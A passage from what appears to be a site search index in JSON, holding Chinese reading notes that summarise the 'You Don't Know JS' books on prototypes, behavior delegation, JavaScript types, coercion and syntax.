<p>\u6df7\u5165\u6a21\u5f0f(\u65e0\u8bba\u663e\u5f0f\u8fd8\u662f\u9690\u5f0f)\u53ef\u4ee5\u7528\u6765\u6a21\u62df\u7c7b\u7684\u590d\u5236\u884c\u4e3a,\u4f46\u662f\u901a\u5e38\u4f1a\u4ea7\u751f\u4e11\u964b\u5e76\u4e14\u8106 \u5f31\u7684\u8bed\u6cd5,\u6bd4\u5982\u663e\u5f0f\u4f2a\u591a\u6001( OtherObj.methodName.call(this, ...) ),\u8fd9\u4f1a\u8ba9\u4ee3\u7801\u66f4\u52a0\u96be \u61c2\u5e76\u4e14\u96be\u4ee5\u7ef4\u62a4\u3002</p> <p>\u6b64\u5916, \u663e\u5f0f\u6df7\u5165\u5b9e\u9645\u4e0a\u65e0\u6cd5\u5b8c\u5168\u6a21\u62df\u7c7b\u7684\u590d\u5236\u884c\u4e3a, \u56e0\u4e3a\u5bf9\u8c61(\u548c\u51fd\u6570!\u522b\u5fd8\u4e86\u51fd\u6570\u4e5f \u662f\u5bf9\u8c61)\u53ea\u80fd\u590d\u5236\u5f15\u7528, \u65e0\u6cd5\u590d\u5236\u88ab\u5f15\u7528\u7684\u5bf9\u8c61\u6216\u8005\u51fd\u6570\u672c\u8eab\u3002 \u5ffd\u89c6\u8fd9\u4e00\u70b9\u4f1a\u5bfc\u81f4\u8bb8\u591a \u95ee\u9898\u3002</p> <p>\u603b\u5730\u6765\u8bf4,\u5728 JavaScript \u4e2d\u6a21\u62df\u7c7b\u662f\u5f97\u4e0d\u507f\u5931\u7684,\u867d\u7136\u80fd\u89e3\u51b3\u5f53\u524d\u7684\u95ee\u9898,\u4f46\u662f\u53ef\u80fd\u4f1a\u57cb\u4e0b\u66f4\u591a\u7684\u9690\u60a3\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_10","title":"\u539f\u578b","text":"<p>\u5982\u679c\u8981\u8bbf\u95ee\u5bf9\u8c61\u4e2d\u5e76\u4e0d\u5b58\u5728\u7684\u4e00\u4e2a\u5c5e\u6027, [[Get]] \u64cd\u4f5c(\u53c2\u89c1\u7b2c 3 \u7ae0)\u5c31\u4f1a\u67e5\u627e\u5bf9\u8c61\u5185\u90e8 [[Prototype]] \u5173\u8054\u7684\u5bf9\u8c61\u3002\u8fd9\u4e2a\u5173\u8054\u5173\u7cfb\u5b9e\u9645\u4e0a\u5b9a\u4e49\u4e86\u4e00\u6761\u201c\u539f\u578b\u94fe\u201d(\u6709\u70b9\u50cf\u5d4c\u5957\u7684\u4f5c\u7528\u57df\u94fe),\u5728\u67e5\u627e\u5c5e\u6027\u65f6\u4f1a\u5bf9\u5b83\u8fdb\u884c\u904d\u5386\u3002</p> <p>\u6240\u6709\u666e\u901a\u5bf9\u8c61\u90fd\u6709\u5185\u7f6e\u7684 Object.prototype ,\u6307\u5411\u539f\u578b\u94fe\u7684\u9876\u7aef(\u6bd4\u5982\u8bf4\u5168\u5c40\u4f5c\u7528\u57df),\u5982 \u679c\u5728\u539f\u578b\u94fe\u4e2d\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u5c5e\u6027\u5c31\u4f1a\u505c\u6b62\u3002 toString() \u3001 valueOf() \u548c\u5176\u4ed6\u4e00\u4e9b\u901a\u7528\u7684\u529f\u80fd \u90fd\u5b58\u5728\u4e8e Object.prototype \u5bf9\u8c61\u4e0a,\u56e0\u6b64\u8bed\u8a00\u4e2d\u6240\u6709\u7684\u5bf9\u8c61\u90fd\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u3002</p> <p>\u5173\u8054\u4e24\u4e2a\u5bf9\u8c61\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 new \u5173\u952e\u8bcd\u8fdb\u884c\u51fd\u6570\u8c03\u7528, \u5728\u8c03\u7528\u7684 \u7ae0)\u4e2d\u4f1a\u521b\u5efa\u4e00\u4e2a\u5173\u8054\u5176\u4ed6\u5bf9\u8c61\u7684\u65b0\u5bf9\u8c61\u30024\u4e2a\u6b65\u9aa4(\u7b2c2\u7ae0)\u4e2d\u4f1a\u521b\u5efa\u4e00\u4e2a\u5173\u8054\u5176\u4ed6\u5bf9\u8c61\u7684\u65b0\u5bf9\u8c61\u3002</p> <p>\u4f7f\u7528 new \u8c03\u7528\u51fd\u6570\u65f6\u4f1a\u628a\u65b0\u5bf9\u8c61\u7684 .prototype \u5c5e\u6027\u5173\u8054\u5230\u201c\u5176\u4ed6\u5bf9\u8c61\u201d\u3002\u5e26 new \u7684\u51fd\u6570\u8c03\u7528 \u901a\u5e38\u88ab\u79f0\u4e3a\u201c\u6784\u9020\u51fd\u6570\u8c03\u7528\u201d,\u5c3d\u7ba1\u5b83\u4eec\u5b9e\u9645\u4e0a\u548c\u4f20\u7edf\u9762\u5411\u7c7b\u8bed\u8a00\u4e2d\u7684 \u7c7b\u6784\u9020\u51fd\u6570 \u4e0d\u4e00\u6837\u3002</p> <p>JavaScript \u662f \u4e2d\u7684\u673a\u5236\u6709\u4e00\u4e2a\u6838\u5fc3\u533a\u522b, \u90a3\u5c31\u662f\u4e0d\u4f1a\u8fdb\u884c\u590d\u5236, \u5bf9\u8c61\u4e4b\u95f4\u662f\u901a\u8fc7\u5185\u90e8\u7684</p> <p>\u867d\u7136\u8fd9\u4e9b \u673a\u5236\u548c\u4f20\u7edf\u9762\u5411\u7c7b\u8bed\u8a00\u4e2d\u7684\u201c\u7c7b\u521d\u59cb\u5316\u201d\u548c\u201c\u7c7b\u7ee7\u627f\u201d\u5f88\u76f8\u4f3c, \u4f46\u662f javascript \u673a\u5236\u548c\u4f20\u7edf\u9762\u5411\u5bf9\u8c61\u7c7b\u8bed\u8a00\u4e2d\u7684\u201c\u7c7b\u521d\u59cb\u5316\u201d\u548c\u201c\u7c7b\u7ee7\u627f\u201d\u5f88\u76f8\u4f3c\u4f46\u662f javascript \u4e2d\u7684\u673a\u5236\u6709\u4e00\u4e2a\u6838\u5fc3\u533a\u522b\uff0c\u5c31\u662f\u4e0d\u4f1a\u8fdb\u884c\u590d\u5236\uff0c\u5bf9\u8c61\u4e4b\u95f4\u662f\u901a\u8fc7\u5185\u90e8\u7684 [[Prototype]] \u94fe\u5173\u8054\u7684\u3002</p> <p>\u51fa\u4e8e\u5404\u79cd\u539f\u56e0,\u4ee5\u201c\u7ee7\u627f\u201d\u7ed3\u5c3e\u7684\u672f\u8bed(\u5305\u62ec\u201c\u539f\u578b\u7ee7\u627f\u201d)\u548c\u5176\u4ed6\u9762\u5411\u5bf9\u8c61\u7684\u672f\u8bed\u90fd\u65e0 \u6cd5\u5e2e\u52a9\u4f60\u7406\u89e3 JavaScript \u7684 \u771f\u5b9e \u673a\u5236(\u4e0d\u4ec5\u4ec5\u662f\u9650\u5236\u6211\u4eec\u7684\u601d\u7ef4\u6a21\u5f0f)\u3002</p> <p>\u76f8\u6bd4\u4e4b\u4e0b,\u201c\u59d4\u6258\u201d\u662f\u4e00\u4e2a\u66f4\u5408\u9002\u7684\u672f\u8bed,\u56e0\u4e3a\u5bf9\u8c61\u4e4b\u95f4\u7684\u5173\u7cfb\u4e0d\u662f \u590d\u5236 \u800c\u662f\u59d4\u6258\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_11","title":"\u884c\u4e3a\u59d4\u6258","text":"<p>\u5728\u8f6f\u4ef6\u67b6\u6784\u4e2d\u4f60\u53ef\u4ee5 \u9009\u62e9\u662f\u5426 \u4f7f\u7528\u7c7b\u548c\u7ee7\u627f\u8bbe\u8ba1\u6a21\u5f0f\u3002\u5927\u591a\u6570\u5f00\u53d1\u8005\u7406\u6240\u5f53\u7136\u5730\u8ba4\u4e3a\u7c7b\u662f \u552f\u4e00(\u5408\u9002)\u7684\u4ee3\u7801\u7ec4\u7ec7\u65b9\u5f0f,\u4f46\u662f\u672c\u7ae0\u4e2d\u6211\u4eec\u770b\u5230\u4e86\u53e6\u4e00\u79cd\u66f4\u5c11\u89c1\u4f46\u662f\u66f4\u5f3a\u5927\u7684\u8bbe\u8ba1\u6a21\u5f0f: \u884c\u4e3a\u59d4\u6258 \u3002</p> <p>\u884c\u4e3a\u59d4\u6258\u8ba4\u4e3a\u5bf9\u8c61\u4e4b\u95f4\u662f\u5144\u5f1f\u5173\u7cfb, \u4e92\u76f8\u59d4\u6258, \u800c\u4e0d\u662f\u7236\u7c7b\u548c\u5b50\u7c7b\u7684\u5173\u7cfb\u3002 JavaScript \u7684 [[Prototype]] \u673a\u5236\u672c\u8d28\u4e0a\u5c31\u662f\u884c\u4e3a\u59d4\u6258\u673a\u5236\u3002\u4e5f\u5c31\u662f\u8bf4,\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5728 JavaScript \u4e2d\u52aa \u529b\u5b9e\u73b0\u7c7b\u673a\u5236(\u53c2\u89c1\u7b2c 4 \u548c\u7b2c 5 \u7ae0),\u4e5f\u53ef\u4ee5\u62e5\u62b1\u66f4\u81ea\u7136\u7684 [[Prototype]] \u59d4\u6258\u673a\u5236\u3002</p> <p>\u5f53\u4f60\u53ea\u7528\u5bf9\u8c61\u6765\u8bbe\u8ba1\u4ee3\u7801\u65f6,\u4e0d\u4ec5\u53ef\u4ee5\u8ba9\u8bed\u6cd5\u66f4\u52a0\u7b80\u6d01,\u800c\u4e14\u53ef\u4ee5\u8ba9\u4ee3\u7801\u7ed3\u6784\u66f4\u52a0\u6e05\u6670\u3002</p> <p>\u5bf9\u8c61\u5173\u8054(\u5bf9\u8c61\u4e4b\u524d\u4e92\u76f8\u5173\u8054)\u662f\u4e00\u79cd\u7f16\u7801\u98ce\u683c,\u5b83\u5021\u5bfc\u7684\u662f\u76f4\u63a5\u521b\u5efa\u548c\u5173\u8054\u5bf9\u8c61,\u4e0d\u628a \u5b83\u4eec\u62bd\u8c61\u6210\u7c7b\u3002\u5bf9\u8c61\u5173\u8054\u53ef\u4ee5\u7528\u57fa\u4e8e [[Prototype]] \u7684\u884c\u4e3a\u59d4\u6258\u975e\u5e38\u81ea\u7136\u5730\u5b9e\u73b0\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/#_12","title":"\u6269\u5c55","text":"<p>\u601d\u7ef4\u5bfc\u56fe\u80fd\u6bd4\u8f83\u6e05\u6670\u7684\u8fd8\u539f\u6574\u672c\u4e66\u7684\u77e5\u8bc6\u7ed3\u6784\u4f53\u7cfb\uff0c\u5982\u679c\u4f60\u8fd8\u6ca1\u7528\u770b\u8fc7\u8fd9\u672c\u4e66\uff0c\u53ef\u4ee5\u6309\u7167\u8fd9\u4e2a\u601d\u7ef4\u5bfc\u56fe\u7684\u601d\u8def\u5feb\u901f\u9884\u4e60\u4e00\u904d\uff0c\u63d0\u9ad8\u5b66\u4e60\u6548\u7387\u3002\u5b66\u4e60\u65b0\u4e8b\u7269\u603b\u5bb9\u6613\u9057\u5fd8\uff0c\u6211\u6bd4\u8f83\u559c\u6b22\u5728\u770b\u4e66\u7684\u65f6\u5019\u7528\u601d\u7ef4\u5bfc\u56fe\u505a\u4e9b\u8bb0\u5f55\uff0c\u4fbf\u4e8e\u81ea\u5df1\u540e\u671f\u590d\u4e60\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u770b\u8fc7\u4e86\u8fd9\u672c\u4e66\uff0c\u4e5f\u5efa\u8bae\u4f60\u6536\u85cf\u590d\u4e60\u3002\u5982\u679c\u4f60\u6709\u795e\u9a6c\u5efa\u8bae\u6216\u5219\u60f3\u6cd5\uff0c\u6b22\u8fce\u7559\u8a00\u6216\u52a0\u6211\u5fae\u4fe1\u4ea4\u6d41\uff1a646321933</p> <p>\u4f60\u4e0d\u77e5\u9053\u7684javascript\u4e0a\u5377\u7b2c\u4e8c\u90e8\u5206\u5728\u7ebf\u6587\u6863</p> <p>\u4f60\u4e0d\u77e5\u9053\u7684 javascript\uff08\u4e0a\u5377\uff09PDF \u4e0b\u8f7d\u5730\u5740</p> <p>\u601d\u7ef4\u5bfc\u56fe\u4e0b\u8f7d\u5730\u5740</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/","title":"\u7cbe\u8bfb\u300a\u4f60\u4e0d\u77e5\u9053\u7684javascript\uff08\u4e2d\u5377\uff09\u300b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 15407  \u9605\u8bfb31\u5206\u949f</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_1","title":"\u524d\u8a00","text":"<p>\u300a\u4f60\u4e0d\u77e5\u9053\u7684 javascript\u300b\u662f\u4e00\u4e2a\u524d\u7aef\u5b66\u4e60\u5fc5\u8bfb\u7684\u7cfb\u5217\uff0c\u8ba9\u4e0d\u6c42\u751a\u89e3\u7684JavaScript\u5f00\u53d1\u8005\u8fce\u96be\u800c\u4e0a\uff0c\u6df1\u5165\u8bed\u8a00\u5185\u90e8\uff0c\u5f04\u6e05\u695aJavaScript\u6bcf\u4e00\u4e2a\u96f6\u90e8\u4ef6\u7684\u7528\u9014\u3002\u672c\u4e66\u300a\u4f60\u4e0d\u77e5\u9053\u7684javascript\u300b\u4e2d\u5377\u4ecb\u7ecd\u4e86\u8be5\u7cfb\u5217\u7684\u4e24\u4e2a\u4e3b\u9898\uff1a\u201c\u7c7b\u578b\u548c\u8bed\u6cd5\u201d\u4ee5\u53ca\u201c\u5f02\u6b65\u4e0e\u6027\u80fd\u201d\u3002\u8fd9\u4e24\u5757\u4e5f\u662f\u503c\u5f97\u6211\u4eec\u53cd\u590d\u53bb\u5b66\u4e60\u7422\u78e8\u7684\u4e24\u5757\u53ea\u662f\u5185\u5bb9\uff0c\u4eca\u5929\u6211\u4eec\u7528\u601d\u7ef4\u5bfc\u56fe\u7684\u65b9\u5f0f\u6765\u7cbe\u8bfb\u4e00\u904d\u3002\uff08\u601d\u7ef4\u5bfc\u56fe\u56fe\u7247\u53ef\u80fd\u6709\u70b9\u5c0f\uff0c\u8bb0\u5f97\u70b9\u5f00\u770b\uff0c\u4f60\u4f1a\u6709\u6240\u6536\u83b7\uff09</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_2","title":"\u7b2c\u4e00\u90e8\u5206 \u4f5c\u7528\u57df\u548c\u95ed\u5305","text":""},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_3","title":"\u7c7b\u578b","text":"<p>JavaScript \u6709 \u4e03 \u79cd \u5185 \u7f6e \u7c7b \u578b: null \u3001 undefined \u3001 boolean \u3001 number \u3001 string \u3001 object \u548c symbol ,\u53ef\u4ee5\u4f7f\u7528 typeof \u8fd0\u7b97\u7b26\u6765\u67e5\u770b\u3002 \u53d8\u91cf\u6ca1\u6709\u7c7b\u578b,\u4f46\u5b83\u4eec\u6301\u6709\u7684\u503c\u6709\u7c7b\u578b\u3002\u7c7b\u578b\u5b9a\u4e49\u4e86\u503c\u7684\u884c\u4e3a\u7279\u5f81\u3002 \u5f88 \u591a \u5f00 \u53d1 \u4eba \u5458 \u5c06 undefined \u548c undeclared \u6df7 \u4e3a \u4e00 \u8c08, \u4f46 \u5728 JavaScript \u4e2d \u5b83 \u4eec \u662f \u4e24 \u7801 \u4e8b\u3002 undefined \u662f\u503c\u7684\u4e00\u79cd\u3002 undeclared \u5219\u8868\u793a\u53d8\u91cf\u8fd8\u6ca1\u6709\u88ab\u58f0\u660e\u8fc7\u3002 \u9057\u61be\u7684\u662f, JavaScript \u5374\u5c06\u5b83\u4eec\u6df7\u4e3a\u4e00\u8c08, \u5728\u6211\u4eec\u8bd5\u56fe\u8bbf\u95ee \"undeclared\" \u53d8\u91cf\u65f6\u8fd9\u6837\u62a5 \u9519:ReferenceError: a is not defined, \u5e76 \u4e14 typeof \u5bf9 undefined \u548c undeclared \u53d8 \u91cf \u90fd \u8fd4 \u56de \"undefined\" \u3002 \u7136\u800c,\u901a\u8fc7 typeof \u7684\u5b89\u5168\u9632\u8303\u673a\u5236(\u963b\u6b62\u62a5\u9519)\u6765\u68c0\u67e5 undeclared \u53d8\u91cf,\u6709\u65f6\u662f\u4e2a\u4e0d\u9519\u7684\u529e\u6cd5\u3002 \u503c</p> <p></p> <p></p> <p></p> <p>JavaScript \u4e2d\u7684\u6570\u7ec4\u662f\u901a\u8fc7\u6570\u5b57\u7d22\u5f15\u7684\u4e00\u7ec4\u4efb\u610f\u7c7b\u578b\u7684\u503c\u3002\u5b57\u7b26\u4e32\u548c\u6570\u7ec4\u7c7b\u4f3c,\u4f46\u662f\u5b83\u4eec\u7684 \u884c\u4e3a\u7279\u5f81\u4e0d\u540c, \u5728\u5c06\u5b57\u7b26\u4f5c\u4e3a\u6570\u7ec4\u6765\u5904\u7406\u65f6\u9700\u8981\u7279\u522b\u5c0f\u5fc3\u3002 JavaScript \u4e2d\u7684\u6570\u5b57\u5305\u62ec\u201c\u6574 \u6570\u201d\u548c\u201c\u6d6e\u70b9\u578b\u201d\u3002 \u57fa\u672c\u7c7b\u578b\u4e2d\u5b9a\u4e49\u4e86\u51e0\u4e2a\u7279\u6b8a\u7684\u503c\u3002 null \u7c7b\u578b\u53ea\u6709\u4e00\u4e2a\u503c null , undefined \u7c7b\u578b\u4e5f\u53ea\u6709\u4e00\u4e2a\u503c undefined \u3002 \u6240\u6709\u53d8\u91cf\u5728\u8d4b\u503c\u4e4b \u524d\u9ed8\u8ba4\u503c\u90fd\u662f undefined \u3002 void \u8fd0\u7b97\u7b26\u8fd4\u56de undefined \u3002 \u6570 \u5b57 \u7c7b \u578b \u6709 \u51e0 \u4e2a \u7279 \u6b8a \u503c, \u5305 \u62ec NaN ( \u610f \u6307\u201cnot a number\u201d , \u66f4 \u786e \u5207 \u5730 \u8bf4 \u662f\u201cinvalid number\u201d )\u3001 +Infinity \u3001 -Infinity \u548c -0 \u3002 \u7b80\u5355\u6807\u91cf\u57fa\u672c\u7c7b\u578b\u503c(\u5b57\u7b26\u4e32\u548c\u6570\u5b57\u7b49)\u901a\u8fc7\u503c\u590d\u5236\u6765\u8d4b\u503c / \u4f20\u9012, \u800c\u590d\u5408\u503c(\u5bf9\u8c61\u7b49) \u901a\u8fc7\u5f15\u7528\u590d\u5236\u6765\u8d4b\u503c / \u4f20\u9012\u3002 JavaScript \u4e2d\u7684\u5f15\u7528\u548c\u5176\u4ed6\u8bed\u8a00\u4e2d\u7684\u5f15\u7528 / \u6307\u9488\u4e0d\u540c,\u5b83\u4eec\u4e0d \u80fd\u6307\u5411\u522b\u7684\u53d8\u91cf / \u5f15\u7528,\u53ea\u80fd\u6307\u5411\u503c\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_4","title":"\u539f\u751f\u51fd\u6570","text":"<p>JavaScript \u4e3a\u57fa\u672c\u6570\u636e\u7c7b\u578b\u503c\u63d0\u4f9b\u4e86\u5c01\u88c5\u5bf9\u8c61,\u79f0\u4e3a\u539f\u751f\u51fd\u6570(\u5982 String \u3001 Number \u3001 Boolean \u7b49)\u3002\u5b83\u4eec\u4e3a\u57fa\u672c\u6570\u636e\u7c7b\u578b\u503c\u63d0\u4f9b\u4e86\u8be5\u5b50\u7c7b\u578b\u6240\u7279\u6709\u7684\u65b9\u6cd5\u548c\u5c5e\u6027(\u5982: String#trim() \u548c Array#concat(..) )\u3002 \u5bf9\u4e8e\u7b80\u5355\u6807\u91cf\u57fa\u672c\u7c7b\u578b\u503c,\u6bd4\u5982 \"abc\" ,\u5982\u679c\u8981\u8bbf\u95ee\u5b83\u7684 length \u5c5e\u6027\u6216 String.prototype \u65b9\u6cd5, JavaScript \u5f15\u64ce\u4f1a\u81ea\u52a8\u5bf9\u8be5\u503c\u8fdb\u884c\u5c01\u88c5(\u5373\u7528\u76f8\u5e94\u7c7b\u578b\u7684\u5c01\u88c5\u5bf9\u8c61\u6765\u5305\u88c5\u5b83)\u6765\u5b9e\u73b0\u5bf9\u8fd9\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u8bbf\u95ee\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_5","title":"\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362","text":"<p>\u672c\u7ae0\u4ecb\u7ecd\u4e86 JavaScript \u7684\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u7684\u8f6c\u6362,\u5373\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362:\u5305\u62ec\u663e\u5f0f\u548c\u9690\u5f0f\u3002 \u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u5e38\u5e38\u4e3a\u4eba\u8bdf\u75c5, \u4f46\u5b9e\u9645\u4e0a\u5f88\u591a\u65f6\u5019\u5b83\u4eec\u662f\u975e\u5e38\u6709\u7528\u7684\u3002 \u4f5c\u4e3a\u6709\u4f7f\u547d\u611f\u7684 JavaScript \u5f00\u53d1\u4eba\u5458,\u6211\u4eec\u6709\u5fc5\u8981\u6df1\u5165\u4e86\u89e3\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362,\u8fd9\u6837\u5c31\u80fd\u53d6\u5176\u7cbe\u534e,\u53bb\u5176\u7cdf\u7c95\u3002 \u663e\u5f0f\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u660e\u786e\u544a\u8bc9\u6211\u4eec\u54ea\u91cc\u53d1\u751f\u4e86\u7c7b\u578b\u8f6c\u6362, \u6709\u52a9\u4e8e\u63d0\u9ad8\u4ee3\u7801\u53ef\u8bfb\u6027\u548c\u53ef\u7ef4 \u62a4\u6027\u3002 \u9690\u5f0f\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u5219\u6ca1\u6709\u90a3\u4e48\u660e\u663e,\u662f\u5176\u4ed6\u64cd\u4f5c\u7684\u526f\u4f5c\u7528\u3002\u611f\u89c9\u4e0a\u597d\u50cf\u662f\u663e\u5f0f\u5f3a\u5236\u7c7b\u578b\u8f6c \u6362\u7684\u53cd\u9762,\u5b9e\u9645\u4e0a\u9690\u5f0f\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u4e5f\u6709\u52a9\u4e8e\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u3002 \u5728\u5904\u7406\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u7684\u65f6\u5019\u8981\u5341\u5206\u5c0f\u5fc3,\u5c24\u5176\u662f\u9690\u5f0f\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u3002\u5728\u7f16\u7801\u7684\u65f6\u5019,\u8981\u77e5 \u5176\u7136,\u8fd8\u8981\u77e5\u5176\u6240\u4ee5\u7136,\u5e76\u52aa\u529b\u8ba9\u4ee3\u7801\u6e05\u6670\u6613\u8bfb\u3002</p>"},{"location":"other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/#_6","title":"\u8bed\u6cd5","text":"<p>JavaScript \u8bed\u6cd5\u89c4\u5219\u4e2d\u7684\u8bb8\u591a\u7ec6\u8282\u9700\u8981\u6211\u4eec\u591a\u82b1\u70b9\u65f6\u95f4\u548c\u7cbe\u529b\u6765\u4e86\u89e3\u3002 \u4ece\u957f\u8fdc\u6765\u770b, \u8fd9\u6709 \u52a9\u4e8e\u66f4\u6df1\u5165\u5730\u638c\u63e1\u8fd9\u95e8\u8bed\u8a00\u3002 \u8bed\u53e5\u548c\u8868\u8fbe\u5f0f\u5728\u82f1\u8bed\u4e2d\u90fd\u80fd\u627e\u5230\u7c7b\u6bd4\u2014\u2014\u8bed\u53e5\u5c31\u50cf\u82f1\u8bed\u4e2d\u7684\u53e5\u5b50,\u800c\u8868\u8fbe\u5f0f\u5c31\u50cf\u77ed\u8bed\u3002\u8868 \u8fbe\u5f0f\u53ef\u4ee5\u662f\u7b80\u5355\u72ec\u7acb\u7684,\u5426\u5219\u53ef\u80fd\u4f1a\u4ea7\u751f\u526f\u4f5c\u7528\u3002 JavaScript \u8bed\u6cd5\u89c4\u5219\u4e4b\u4e0a\u662f\u8bed\u4e49\u89c4\u5219(\u4e5f\u79f0\u4f5c\u4e0a\u4e0b\u6587)\u3002\u4f8b\u5982, { } \u5728\u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u610f\u601d\u4e0d \u5c3d\u76f8\u540c,\u53ef\u4ee5\u662f\u8bed\u53e5\u5757\u3001\u5bf9\u8c61\u5e38\u91cf\u3001\u89e3\u6784\u8d4b\u503c(ES6)\u6216\u8005\u547d\u540d\u51fd\u6570\u53c2\u6570(ES6)\u3002 JavaScript \u8be6\u7ec6\u5b9a\u4e49\u4e86\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7(\u8fd0\u7b97\u7b26\u6267\u884c\u7684\u5148\u540e\u987a\u5e8f)\u548c\u5173\u8054(\u591a\u4e2a\u8fd0\u7b97\u7b26\u7684 \u7ec4\u5408\u65b9\u5f0f)\u3002\u53ea\u8981\u719f\u7ec3\u638c\u63e1\u4e86\u8fd9\u4e9b\u89c4\u5219,\u5c31\u80fd\u5bf9\u5982\u4f55\u5408\u7406\u5730\u8fd0\u7528\u5b83\u4eec\u4f5c\u51fa\u81ea\u5df1\u7684\u5224\u65ad\u3002 ASI(\u81ea\u52a8\u5206\u53f7\u63d2\u5165)\u662f JavaScript \u5f15\u64ce\u7684\u4ee3\u7801\u89e3\u6790\u7ea0\u9519\u673a\u5236, \u5b83\u4f1a\u5728\u9700\u8981\u7684\u5730\u65b9\u81ea\u52a8\u63d2 \u5165\u5206\u53f7\u6765\u7ea0\u6b63\u89e3\u6790\u9519\u8bef\u3002\u95ee\u9898\u5728\u4e8e\u8fd9\u662f\u5426\u610f\u5473\u7740\u5927\u591a\u6570\u7684\u5206\u53f7\u90fd\u4e0d\u662f\u5fc5\u8981\u7684(\u53ef\u4ee5\u7701\u7565), \u6216\u8005\u7531\u4e8e\u5206\u53f7\u7f3a\u5931\u5bfc\u81f4\u7684\u9519\u8bef\u662f\u5426\u90fd\u53ef\u4ee5\u4ea4\u7ed9 JavaScript \u5f15\u64ce\u6765\u5904\u7406\u3002 JavaScript \u4e2d\u6709\u5f88\u591a\u9519\u8bef\u7c7b\u578b, \u5206\u4e3a\u4e24\u5927\u7c7b:\u65e9\u671f\u9519\u8bef(\u7f16\u8bd1\u65f6\u9519\u8bef, \u65e0\u6cd5\u88ab\u6355\u83b7)\u548c\u8fd0 \u884c\u65f6\u9519\u8bef(\u53ef\u4ee5\u901a\u8fc7 try..catch \u6765\u6355\u83b7)\u3002\u6240\u6709\u8bed\u6cd5\u9519\u8bef\u90fd\u662f\u65e9\u671f\u9519\u8bef,\u7a0b\u5e8f\u6709\u8bed\u6cd5\u9519\u8bef \u5219\u65e0\u6cd5\u8fd0\u884c\u3002 \u51fd\u6570\u53c2\u6570\u548c\u547d\u540d\u53c2\u6570\u4e4b\u95f4\u7684\u5173\u7cfb\u975e\u5e38\u5fae\u5999\u3002\u5c24\u5176\u662f arguments \u6570\u7ec4,\u5b83\u7684\u62bd\u8c61\u6cc4\u6f0f\u7ed9\u6211\u4eec \u6316\u4e86\u4e0d\u5c11\u5751\u3002\u56e0\u6b64,\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528 arguments ,\u5982\u679c\u975e\u7528\u4e0d\u53ef,\u4e5f\u5207\u52ff\u540c\u65f6\u4f7f\u7528 arguments \u548c\u5176\u5bf9\u5e94\u7684\u547d\u540d\u53c2\u6570\u3002 finally \u4e2d\u4ee3\u7801\u7684\u5904\u7406\u987a\u5e8f\u9700\u8981\u7279\u522b\u6ce8\u610f\u3002\u5b83\u4eec\u6709\u65f6\u80fd\u6d3e\u4e0a\u5f88\u5927\u7528\u573a,\u4f46\u4e5f\u5bb9\u6613\u5f15\u8d77\u56f0\u60d1, \u7279\u522b\u662f\u5728\u548c\u5e26\u6807\u7b7e\u7684\u4ee3\u7801\u5757\u6df7\u7528\u65f6\u3002\u603b\u4e4b,\u4f7f\u7528 finally \u65e8\u5728\u8ba9\u4ee3\u7801\u66f4\u52a0\u7b80\u6d01\u6613\u8bfb,\u5207\u5fcc \u5f04\u5de7\u6210\u62d9\u3002 switch \u76f8\u5bf9\u4e8e if..else if.. \u6765\u8bf4\u66f4\u4e3a\u7b80\u6d01\u3002\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f,\u5982\u679c\u5bf9\u5176\u7406\u89e3\u5f97\u4e0d\u591f\u900f 